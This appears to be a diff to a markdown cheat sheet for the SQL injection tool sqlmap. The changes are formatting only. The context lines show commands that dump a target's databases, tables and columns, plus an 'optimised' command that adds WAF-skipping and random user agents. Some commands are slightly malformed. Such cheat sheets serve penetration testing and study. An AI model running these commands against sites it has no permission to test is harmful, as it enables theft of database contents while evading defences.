@@ -19,14 +19,9 @@ sqlmap - u "url?prm=" -p prm -D dbname  --dump
  ```
  sqlmap - u "url?prm=" -p prm --dbs  --dump
 ``` 
- or use --dump-all instead of --dump to fetch all databases's all tables and columns  
+ **or use --dump-all instead of --dump to fetch all databases's all tables and columns** 
 
 
-<h5>Extra Parameter to Optimise SQLmap's Performance</h5>
+<h4>Extra Parameter to Optimise SQLmap's Performance</h4>
  **Parameters**      **--method GET,   --code 200, --skip-waf, --random-agent, --threads 10 -o **
  **Optimised Url**    **sqlmap -u "url?prm=" -p prm -D dbname -T table_name -C column_name --dump --method GET --code 200 --skip-waf --random-agent --threads 10 -o**
-
-```diff
-+ this text is highlighted in green
-- this text is highlighted in red
-```
